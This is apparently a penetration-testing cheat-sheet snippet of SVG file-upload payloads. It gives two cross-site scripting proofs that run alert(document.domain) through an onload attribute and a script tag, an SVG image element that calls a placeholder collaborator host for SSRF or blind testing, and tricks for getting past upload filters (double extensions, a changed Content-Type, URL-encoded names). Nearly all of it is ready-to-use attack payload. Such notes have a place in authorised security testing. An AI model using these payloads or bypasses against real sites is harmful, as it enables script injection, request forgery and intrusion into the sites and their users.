```svg
<!-- onload alert -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>

<!-- script tag -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- external image -> useful for SSRF/blind testing -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://YOUR-COLLAB.DOMAIN/track?test=svg"/>
</svg>
```
- Bypass:
  - Change `exploit.svg` to `exploit.svg.png` or `exploit.svg.jpg`
  - Modify `Content-Type` to `image/svg+xml` or `text/xml`
  - URL-encode `exploit%2Esvg` or just add **spaces/newlines**
